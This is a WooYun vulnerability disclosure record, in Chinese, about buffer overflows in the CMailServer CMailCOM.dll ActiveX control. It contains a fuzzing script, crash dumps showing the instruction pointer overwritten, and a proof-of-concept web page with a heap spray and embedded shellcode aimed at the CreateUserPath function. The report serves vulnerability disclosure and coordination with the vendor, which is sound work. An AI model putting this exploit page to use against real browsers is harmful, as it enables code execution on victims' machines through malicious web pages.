{"id": 4358, "wybug_id": "wooyun-2014-054443", "wybug_title": "CMailServer Activex控件 CreateUserPath函数缓冲区溢出漏洞", "wybug_corp": "遥志", "wybug_author": "cloud4986", "wybug_date": "2014-03-26 12:44", "wybug_open_date": "2014-05-10 12:45", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["控件漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-04-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-10：\t细节向公众公开  简要描述： 遥志邮件服务器CmailServer5.4.6及以下版本activex插件（CMailCOM.dll）CreateUserPath、AddAttach、DeleteMailByUID、DeleteMailEx、SetBcc、GetMailDataEx、GetMailInfoEx、Logout、MoveToFolder、MoveToInbox、SetBody、SetCc、SetForwardSign、SetFrom、SetFromUID、SetReadSign、SetReplySign、SetSubject、SetTo等10多个函数存在缓冲区溢出漏洞，该漏洞允许通过恶意网页执行任意代码 详细说明：  对遥志邮件服务器CmailServer5.4.6及以下版本activex插件（CMailCOM.dll）CreateUserPath、AddAttach、DeleteMailByUID、DeleteMailEx、SetBcc、GetMailDataEx、GetMailInfoEx、Logout、MoveToFolder、MoveToInbox、SetBody、SetCc、SetForwardSign、SetFrom、SetFromUID、SetReadSign、SetReplySign、SetSubject、SetTo等10多个函数的String参数，构造超长串会导致缓冲区溢出发生，导致覆盖返回地址或seh链从而执行任意代码。   漏洞证明：  （先给出CreateUserPath证明，其余在获取到邀请码后上传）漏洞名称：CreateUserPath函数存在缓冲区溢出漏洞影响版本：CmailServer5.4.6以下版本验证环境：winxp中文版sp1 ie6.0(sp3中文，ie6.0-ie7.0)问题详情：（Fuzz测试结果）<?XML version='1.0' standalone='yes' ?><package><job id='DoneInVBS' debug='false' error='true'><object classid='clsid:6971D9B8-B53E-4C25-A414-76199768A592' id='target' /><script language='vbscript'>'File Generated by COMRaider v0.0.133 - http://labs.idefense.com'Wscript.echo typename(target)'for debugging/custom prologtargetFile = \"C:\\CMailServer2\\CMailCOM.dll\"prototype  = \"Sub CreateUserPath ( ByVal bsUser As String )\"memberName = \"CreateUserPath\"progid     = \"CMAILCOMLib.POP3\"argCount   = 1arg1=String(3092, \"A\")target.CreateUserPath arg1 </script></job></package>Exception Code: VC_THROW_SEHDisasm: 77E53887\tPOP ESI\t(KERNEL32.dll)Seh Chain:--------------------------------------------------1 \t1583910 \tCMailCOM.DLL2 \t41414141 \tCalled From                   Returns To                    --------------------------------------------------KERNEL32.77E53887             CMailCOM.156F3C4              CMailCOM.156F3C4              CMailCOM.156A848              CMailCOM.156A848              CMailCOM.15676B1              CMailCOM.15676B1              CMailCOM.155FC05              CMailCOM.155FC05              41414141                      Registers:--------------------------------------------------EIP 77E53887 -> E06D7363 -> Asc: csmcsmEAX 0012A98C -> E06D7363 -> Asc: csmcsmEBX 015848A4 -> 01547E60ECX 00000000EDX 0012AA2C -> 01591DE4EDI 0012AA1C -> 0012AA48ESI 0012AA1C -> 0012AA48EBP 0012A9DC -> 0012AA1CESP 0012A988 -> 01586430 -> Asc: 0dX0dXBlock Disassembly: --------------------------------------------------77E53877\tLEA EDI,[EBP-3C]77E5387A\tREP MOVS DWORD PTR ES:[EDI],DWORD PTR [ESI]77E5387C\tPOP EDI77E5387D\tLEA EAX,[EBP-50]77E53880\tPUSH EAX77E53881\tCALL [77E41500]77E53887\tPOP ESI\t  <--- CRASH77E53888\tLEAVE77E53889\tRETN 1077E5388C\tPUSH 1877E5388E\tPUSH 77E6302877E53893\tCALL 77E5A2D877E53898\tMOV EAX,FS:[18]77E5389E\tMOV ESI,[EAX+30]77E538A1\tCALL [77E410B8]ArgDump:--------------------------------------------------EBP+8\tE06D7363EBP+12\t00000001EBP+16\t00000003EBP+20\t0012AA10 -> 19930520EBP+24\t0012ADA1 -> 60015839 -> Asc: 9X9XEBP+28\t0016EC84 -> 00140008Stack Dump:--------------------------------------------------12A988 30 64 58 01 63 73 6D E0 01 00 00 00 00 00 00 00  [.dX.csm.........]12A998 87 38 E5 77 03 00 00 00 20 05 93 19 2C AA 12 00  [...w............]12A9A8 18 9E 58 01 07 00 00 00 00 00 00 00 00 00 00 00  [..X.............]12A9B8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  [................]12A9C8 FF FF FF FF FF FF FF FF 34 0C 00 00 14 E7 12 00  [................]Exception Code: ACCESS_VIOLATIONDisasm: 41414141\t?????\t()Seh Chain:--------------------------------------------------1 \t41414141 \tCalled From                   Returns To                    --------------------------------------------------Registers:--------------------------------------------------EIP 41414141EAX 00000000EBX 015848A4 -> 01547E60ECX 77F5166A -> 56000CC2EDX 00140608 -> 77FC3460 -> Asc: `4`4EDI 00000000ESI 0016EC84 -> 00140008EBP 41414141ESP 0012E934 -> Asc: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABlock Disassembly: --------------------------------------------------41414141\t?????\t  <--- CRASHStack Dump:--------------------------------------------------12E934 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  [................]12E944 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  [................]12E954 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  [................]12E964 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  [................]12E974 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  [................]POC代码：<html><body><object classid='clsid:6971D9B8-B53E-4C25-A414-76199768A592' id='target' /></object><script>var nops = unescape(\"%u9090%u9090\");var shellcode=\"\\u68fc\\u0a6a\\u1e38\\u6368\\ud189\\u684f\\u7432\\u0c91\\uf48b\\u7e8d\\u33f4\\ub7db\\u2b04\\u66e3\\u33bb\\u5332\\u7568\\u6573\\u5472\\ud233\\u8b64\\u305a\\u4b8b\\u8b0c\\u1c49\\u098b\\u698b\\uad08\\u6a3d\\u380a\\u751e\\u9505\\u57ff\\u95f8\\u8b60\\u3c45\\u4c8b\\u7805\\ucd03\\u598b\\u0320\\u33dd\\u47ff\\u348b\\u03bb\\u99f5\\ube0f\\u3a06\\u74c4\\uc108\\u07ca\\ud003\\ueb46\\u3bf1\\u2454\\u751c\\u8be4\\u2459\\udd03\\u8b66\\u7b3c\\u598b\\u031c\\u03dd\\ubb2c\\u5f95\\u57ab\\u3d61\\u0a6a\\u1e38\\ua975\\udb33\\u6853\\u6577\\u7473\\u6668\\u6961\\u8b6c\\u53c4\\u5050\\uff53\\ufc57\\uff53\\uf857\";while (nops.length < 0x100000)   nops += nops;nops=nops.substring(0,0x100000/2-32/2-4/2-2/2-shellcode.length);nops=nops+shellcode;var memory = new Array();for (var i=0;i<250;i++)  memory[i] += nops;var str = '';while(str.length < 2048) str += '\\x0C\\x0C\\x0C\\x0C'; //target.CreateUserPath(str);</script></body></html>   修复方案：  目前厂商还没有修补措施，可以先禁用activex控件和脚本   版权声明：转载请注明来源 cloud4986@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2014-03-30 23:09 厂商回复： 可用于挂马威胁，对于白帽子提交的多个漏洞，拟披量收录并协调软件生产厂商。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}